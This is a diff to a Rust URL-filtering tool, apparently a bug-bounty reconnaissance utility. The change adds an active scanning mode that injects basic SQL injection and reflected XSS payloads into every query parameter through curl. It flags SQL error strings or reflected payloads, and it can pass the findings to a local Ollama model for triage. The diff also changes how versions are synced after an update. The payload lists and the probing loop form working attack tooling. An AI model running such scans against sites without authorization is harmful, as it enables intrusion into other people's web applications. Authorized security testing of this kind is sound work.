@@ -44,6 +44,32 @@ const CYAN: &str = "\x1b[96m";
 const RESET: &str = "\x1b[0m";
 const BOLD: &str = "\x1b[1m";
 
+// Configuração de LLM local (Ollama)
+const OLLAMA_MODEL_DEFAULT: &str = "phi3:mini"; // modelo leve e rápido
+
+// Payloads e padrões para exploração ativa
+const SQLI_PAYLOADS: &[&str] = &[
+    "' OR '1'='1'--",
+    "\" OR \"1\"=\"1\"--",
+    "' UNION SELECT NULL--",
+    "' AND SLEEP(5)--",
+];
+const SQLI_PADROES_ERRO: &[&str] = &[
+    "sql syntax",
+    "mysql",
+    "sqlstate",
+    "postgresql",
+    "sqlite",
+    "oracle",
+    "ora-",
+    "unterminated string",
+    "unexpected end of",
+];
+const XSS_PAYLOADS: &[&str] = &[
+    r#"<script>alert(1337)</script>"#,
+    r#""><svg/onload=alert(1337)>"#,
+];
+
 fn main() {
     let args: Vec<String> = env::args().collect();
     
@@ -67,6 +93,13 @@ fn main() {
     // Verifica as flags globais
     let verbose = args.contains(&"-v".to_string()) || args.contains(&"--verbose".to_string());
     let check_status = args.contains(&"-status".to_string()) || args.contains(&"--status".to_string());
+    let explorar = args.contains(&"-p".to_string()) || args.contains(&"--explore".to_string());
+    let usar_ollama = args.contains(&"--ollama".to_string());
+    let modelo_ollama = args
+        .windows(2)
+        .find(|w| w[0] == "--ollama-model")
+        .map(|w| w[1].clone())
+        .unwrap_or_else(|| OLLAMA_MODEL_DEFAULT.to_string());
     
     // Verifica se é passado um domínio único (-d)
     if let Some(pos) = args.iter().position(|x| x == "-d") {
@@ -95,7 +128,7 @@ fn main() {
     // Modo padrão: apenas filtrar URLs passadas por -l
     let (arquivo_entrada, arquivo_saida) = processar_argumentos();
     
-    if let Err(e) = filtrar_urls(&arquivo_entrada, &arquivo_saida, verbose, check_status) {
+    if let Err(e) = filtrar_urls(&arquivo_entrada, &arquivo_saida, verbose, check_status, explorar, usar_ollama, &modelo_ollama) {
         eprintln!("{}[✗] Erro ao processar o arquivo: {}{}", RED, e, RESET);
         process::exit(1);
     }
@@ -148,12 +181,19 @@ fn mostrar_help() {
     println!("  {}  -f <arquivo>{}    Arquivo com lista de subdomínios para crawler", CYAN, RESET);
     println!("  {}  -v, --verbose{}   Modo verbose (mostra fluxo de processamento)", MAGENTA, RESET);
     println!("  {}  -status{}          Verificar status HTTP e salvar em arquivos separados", MAGENTA, RESET);
+    println!("  {}  -p, --explore{}   Explorar ativamente os parâmetros (SQLi/XSS básicos)", MAGENTA, RESET);
+    println!("  {}  --ollama{}         Validar achados com Ollama (desliga falsos positivos)", MAGENTA, RESET);
+    println!("  {}  --ollama-model <m>{} Modelo Ollama (padrão: {})", MAGENTA, RESET, OLLAMA_MODEL_DEFAULT);
     println!("  {}  -up, --update{}   Atualizar a ferramenta do Git e recompilar", MAGENTA, RESET);
     println!("  {}  -h, --help{}      Mostra esta mensagem de ajuda\n", YELLOW, RESET);
     
     println!("{}Exemplos:{}", BOLD, RESET);
     println!("  {}Modo padrão (filtrar URLs):{}", GREEN, RESET);
     println!("    {}$ paramstrike -l urls.txt -o resultado.txt{}", GREEN, RESET);
+    println!("  {}Com exploração ativa de parâmetros:{}", GREEN, RESET);
+    println!("    {}$ paramstrike -l urls.txt -o resultado.txt -p{}", GREEN, RESET);
+    println!("  {}Com exploração + validação no LLM local:{}", GREEN, RESET);
+    println!("    {}$ paramstrike -l urls.txt -o resultado.txt -p --ollama --ollama-model {}{}", GREEN, OLLAMA_MODEL_DEFAULT, RESET);
     println!("  {}Com verbose e verificação de status:{}", GREEN, RESET);
     println!("    {}$ paramstrike -l urls.txt -o resultado.txt -v -status{}", GREEN, RESET);
     println!("  {}Atualizar ferramenta:{}", GREEN, RESET);
@@ -183,22 +223,6 @@ fn ler_versao_salva() -> Option<String> {
 // Função para salvar a versão localmente
 fn salvar_versao(versao: &str) -> std::io::Result<()> {
     std::fs::write(".version", versao)
-}
-
-// Função para incrementar a versão semântica (1.0.0 -> 1.1.0)
-fn incrementar_versao(versao: &str) -> String {
-    let partes: Vec<&str> = versao.split('.').collect();
-    if partes.len() == 3 {
-        if let (Ok(major), Ok(mut minor), Ok(patch)) = (
-            partes[0].parse::<u32>(),
-            partes[1].parse::<u32>(),
-            partes[2].parse::<u32>()
-        ) {
-            minor += 1;
-            return format!("{}.{}.{}", major, minor, patch);
-        }
-    }
-    versao.to_string()
 }
 
 // Função para verificar se há atualizações disponíveis
@@ -281,7 +305,7 @@ fn verificar_status_http(url: &str) -> Option<u16> {
     let output = Command::new("curl")
         .arg("-s")
         .arg("-o")
-        .arg("/dev/null")
+        .arg(if cfg!(windows) { "NUL" } else { "/dev/null" })
         .arg("-w")
         .arg("%{http_code}")
         .arg("--max-time")
@@ -335,6 +359,9 @@ fn atualizar_ferramenta() {
     
     println!();
     
+    // Lê a versão do repositório após o pull (fonte de verdade)
+    let versao_repo = obter_versao_repositorio().unwrap_or_else(|| VERSION.to_string());
+    
     // Executa cargo build --release
     println!("{}[2/2] Compilando com cargo...{}", CYAN, RESET);
     println!("{}─────────────────────────────────────────────────────────────────{}", MAGENTA, RESET);
@@ -353,27 +380,10 @@ fn atualizar_ferramenta() {
                 }
                 println!();
                 
-                // Incrementar versão automaticamente
-                if let Some(versao_atual) = ler_versao_salva() {
-                    let nova_versao = incrementar_versao(&versao_atual);
-                    
-                    // Salvar em .version
-                    match salvar_versao(&nova_versao) {
-                        Ok(_) => {
-                            // Salvar também no arquivo VERSION da raiz
-                            match std::fs::write("VERSION", &nova_versao) {
-                                Ok(_) => {
-                                    println!("{}[✓] Versão incrementada: {} → {}{}", GREEN, versao_atual, nova_versao, RESET);
-                                }
-                                Err(e) => {
-                                    eprintln!("{}[!] Aviso ao salvar VERSION: {}{}", YELLOW, e, RESET);
-                                }
-                            }
-                        }
-                        Err(e) => {
-                            eprintln!("{}[!] Aviso ao salvar versão: {}{}", YELLOW, e, RESET);
-                        }
-                    }
+                // Sincroniza .version com a versão do repositório, sem modificar VERSION
+                match salvar_versao(&versao_repo) {
+                    Ok(_) => println!("{}[✓] Versão sincronizada: {}{}", GREEN, versao_repo, RESET);
+                    Err(e) => eprintln!("{}[!] Aviso ao salvar .version: {}{}", YELLOW, e, RESET),
                 }
                 
                 println!();
@@ -381,7 +391,7 @@ fn atualizar_ferramenta() {
                 println!("{}║                                                               ║{}", BLUE, RESET);
                 println!("{}║  {}✓  ATUALIZAÇÃO CONCLUÍDA COM SUCESSO!{}                     {}║{}", BLUE, GREEN, RESET, BLUE, RESET);
                 println!("{}║                                                               ║{}", BLUE, RESET);
-                println!("{}║         {}→ Versão: LATEST{}                                   {}║{}", BLUE, BOLD, RESET, BLUE, RESET);
+                println!("{}║         {}→ Versão: {}{}                                   {}║{}", BLUE, BOLD, versao_repo, RESET, BLUE, RESET);
                 println!("{}║         {}→ Status: RECOMPILADO{}                              {}║{}", BLUE, BOLD, RESET, BLUE, RESET);
                 println!("{}║                                                               ║{}", BLUE, RESET);
                 println!("{}╚═══════════════════════════════════════════════════════════════╝{}", BLUE, RESET);
@@ -416,7 +426,15 @@ fn obter_nome_arquivo_status(status: u16, arquivo_base: &str) -> String {
     format!("{}_{}.txt", sem_extensao, categoria)
 }
 // Função para filtrar URLs e salvar as válidas
-fn filtrar_urls(arquivo_entrada: &str, arquivo_saida: &str, verbose: bool, check_status: bool) -> std::io::Result<()> {
+fn filtrar_urls(
+    arquivo_entrada: &str,
+    arquivo_saida: &str,
+    verbose: bool,
+    check_status: bool,
+    explorar: bool,
+    usar_ollama: bool,
+    modelo_ollama: &str,
+) -> std::io::Result<()> {
     // Lê o arquivo de entrada
     let file = File::open(arquivo_entrada)?;
     let reader = BufReader::new(file);
@@ -429,6 +447,8 @@ fn filtrar_urls(arquivo_entrada: &str, arquivo_saida: &str, verbose: bool, check
     if verbose {
         println!("{}[V] Modo verbose ativado{}", MAGENTA, RESET);
         println!("{}[V] Verificação de status: {}{}", MAGENTA, check_status, RESET);
+        println!("{}[V] Exploração ativa: {}{}", MAGENTA, explorar, RESET);
+        println!("{}[V] Validação Ollama: {} | Modelo: {}{}", MAGENTA, usar_ollama, modelo_ollama, RESET);
     }
     
     // Filtra as URLs que têm parâmetros e não contêm as extensões especificadas
@@ -557,7 +577,226 @@ fn filtrar_urls(arquivo_entrada: &str, arquivo_saida: &str, verbose: bool, check
         println!("{}[✓] URLs filtradas salvas em '{}'{}", GREEN, arquivo_saida, RESET);
     }
     
+    // Exploração ativa de parâmetros (SQLi / XSS básicos)
+    if explorar {
+        explorar_vulnerabilidades(&urls_filtradas, verbose, usar_ollama, modelo_ollama)?;
+    }
+    
     println!();
+    Ok(())
+}
+
+// Codifica payloads para uso seguro na query string
+fn url_encode(texto: &str) -> String {
+    texto
+        .bytes()
+        .map(|b| match b {
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => (b as char).to_string(),
+            _ => format!("%{:02X}", b),
+        })
+        .collect::<Vec<String>>()
+        .join("")
+}
+
+// Constrói URL com um parâmetro substituído pelo payload escolhido
+fn construir_url_injetada(url: &str, alvo: &str, payload: &str) -> Option<String> {
+    let (base, query) = url.split_once('?')?;
+    let mut pares: Vec<(String, String)> = query
+        .split('&')
+        .filter_map(|p| {
+            let mut kv = p.splitn(2, '=');
+            let k = kv.next()?.to_string();
+            let v = kv.next().unwrap_or("").to_string();
+            Some((k, v))
+        })
+        .collect();
+    
+    let mut alterou = false;
+    for (k, v) in pares.iter_mut() {
+        if k == alvo {
+            *v = url_encode(payload);
+            alterou = true;
+        }
+    }
+    
+    if !alterou {
+        return None;
+    }
+    
+    let nova_query = pares
+        .iter()
+        .map(|(k, v)| format!("{}={}", k, v))
+        .collect::<Vec<String>>()
+        .join("&");
+    
+    Some(format!("{}?{}", base, nova_query))
+}
+
+fn parece_erro_sql(corpo: &str) -> bool {
+    let lower = corpo.to_lowercase();
+    SQLI_PADROES_ERRO.iter().any(|padrao| lower.contains(padrao))
+}
+
+fn reflexo_xss(corpo: &str, marcador: &str) -> bool {
+    corpo.contains(marcador)
+}
+
+struct Achado {
+    tipo: &'static str,
+    url: String,
+    parametro: String,
+    payload: String,
+    corpo: String,
+}
+
+// Explora ativamente parâmetros identificados nas URLs
+fn explorar_vulnerabilidades(urls: &[String], verbose: bool, usar_ollama: bool, modelo: &str) -> std::io::Result<()> {
+    println!("{}[*] Explorando parâmetros suspeitos (SQLi/XSS)...{}", BLUE, RESET);
+    let mut total_testes = 0usize;
+    let mut achados: Vec<Achado> = Vec::new();
+    
+    for url in urls {
+        if !url.contains('?') {
+            continue;
+        }
+        
+        let params: Vec<String> = url
+            .splitn(2, '?')
+            .nth(1)
+            .unwrap_or("")
+            .split('&')
+            .filter_map(|p| p.split_once('=').map(|(k, _)| k.to_string()))
+            .collect();
+        
+        for param in params {
+            // SQLi
+            for payload in SQLI_PAYLOADS {
+                if let Some(test_url) = construir_url_injetada(url, &param, payload) {
+                    total_testes += 1;
+                    match Command::new("curl")
+                        .arg("-s")
+                        .arg("--max-time")
+                        .arg("8")
+                        .arg(&test_url)
+                        .output()
+                    {
+                        Ok(out) => {
+                            let body = String::from_utf8_lossy(&out.stdout);
+                            if parece_erro_sql(&body) {
+                                println!("{}[!] Possível SQLi em '{}' parâmetro '{}' com payload \"{}\"{}", YELLOW, url, param, payload, RESET);
+                                achados.push(Achado {
+                                    tipo: "SQLi",
+                                    url: url.clone(),
+                                    parametro: param.clone(),
+                                    payload: payload.to_string(),
+                                    corpo: body.chars().take(8000).collect(),
+                                });
+                            } else if verbose {
+                                println!("{}[V] Testado SQLi {}={}{}", MAGENTA, param, payload, RESET);
+                            }
+                        }
+                        Err(e) => {
+                            if verbose {
+                                println!("{}[V] Falha ao testar {}: {}{}", YELLOW, url, e, RESET);
+                            }
+                        }
+                    }
+                }
+            }
+            
+            // XSS
+            for payload in XSS_PAYLOADS {
+                if let Some(test_url) = construir_url_injetada(url, &param, payload) {
+                    total_testes += 1;
+                    match Command::new("curl")
+                        .arg("-s")
+                        .arg("--max-time")
+                        .arg("8")
+                        .arg(&test_url)
+                        .output()
+                    {
+                        Ok(out) => {
+                            let body = String::from_utf8_lossy(&out.stdout);
+                            if reflexo_xss(&body, "alert(1337)") {
+                                println!("{}[!] Possível XSS refletido em '{}' parâmetro '{}'{}", YELLOW, url, param, RESET);
+                                achados.push(Achado {
+                                    tipo: "XSS",
+                                    url: url.clone(),
+                                    parametro: param.clone(),
+                                    payload: payload.to_string(),
+                                    corpo: body.chars().take(8000).collect(),
+                                });
+                            } else if verbose {
+                                println!("{}[V] Testado XSS {}={}{}", MAGENTA, param, payload, RESET);
+                            }
+                        }
+                        Err(e) => {
+                            if verbose {
+                                println!("{}[V] Falha ao testar {}: {}{}", YELLOW, url, e, RESET);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    println!("{}[+] Testes ativos executados: {}{}", GREEN, total_testes, RESET);
+    if achados.is_empty() {
+        println!("{}[-] Nenhum comportamento suspeito detectado nos testes básicos.{}", BLUE, RESET);
+    }
+
+    if usar_ollama && !achados.is_empty() {
+        validar_com_ollama(modelo, &achados, verbose)?;
+    }
+    
+    Ok(())
+}
+
+fn validar_com_ollama(modelo: &str, achados: &[Achado], verbose: bool) -> std::io::Result<()> {
+    println!("{}[*] Validando achados com Ollama (modelo: {}){}", CYAN, modelo, RESET);
+    for achado in achados {
+        let prompt = format!(
+            "Classifique rapidamente se este achado de segurança é provavelmente verdadeiro ou falso positivo.\n\
+Tipo: {tipo}\nURL: {url}\nParâmetro: {param}\nPayload: {payload}\nTrecho de resposta (pode estar truncado):\n{corpo}\n\
+Responda somente com 'true_positive' ou 'false_positive' e uma curta justificativa em português.",
+            tipo = achado.tipo,
+            url = achado.url,
+            param = achado.parametro,
+            payload = achado.payload,
+            corpo = achado.corpo
+        );
+
+        match Command::new("ollama")
+            .arg("run")
+            .arg(modelo)
+            .stdin(Stdio::piped())
+            .stdout(Stdio::piped())
+            .spawn()
+        {
+            Ok(mut child) => {
+                if let Some(mut stdin) = child.stdin.take() {
+                    let _ = stdin.write_all(prompt.as_bytes());
+                }
+                let output = child.wait_with_output();
+                match output {
+                    Ok(out) => {
+                        let resposta = String::from_utf8_lossy(&out.stdout);
+                        println!("{}[LLM] {} -> {}{}", GREEN, achado.url, resposta.trim(), RESET);
+                    }
+                    Err(e) => {
+                        eprintln!("{}[LLM] Falha ao ler saída: {}{}", YELLOW, e, RESET);
+                    }
+                }
+            }
+            Err(e) => {
+                eprintln!("{}[LLM] Não foi possível executar ollama: {}{}", YELLOW, e, RESET);
+                if verbose {
+                    eprintln!("{}[V] Instale ollama ou remova --ollama para continuar sem validação.{}", YELLOW, RESET);
+                }
+            }
+        }
+    }
     Ok(())
 }
 
@@ -661,7 +900,7 @@ fn processar_domain_unico(domain: &str) {
     println!("\n{}[*] Iniciando filtragem de URLs{}\n", BLUE, RESET);
     
     // Filtra as URLs
-    if let Err(e) = filtrar_urls(urls_file, &resultado_file, false, false) {
+    if let Err(e) = filtrar_urls(urls_file, &resultado_file, false, false, false, false, OLLAMA_MODEL_DEFAULT) {
         eprintln!("{}[✗] Erro ao filtrar URLs: {}{}", RED, e, RESET);
         process::exit(1);
     }
@@ -700,7 +939,7 @@ fn processar_lista_dominios(arquivo_subs: &str) {
     println!("\n{}[*] Iniciando filtragem de URLs{}\n", BLUE, RESET);
     
     // Filtra as URLs
-    if let Err(e) = filtrar_urls(urls_file, resultado_file, false, false) {
+    if let Err(e) = filtrar_urls(urls_file, resultado_file, false, false, false, false, OLLAMA_MODEL_DEFAULT) {
         eprintln!("{}[✗] Erro ao filtrar URLs: {}{}", RED, e, RESET);
         process::exit(1);
     }
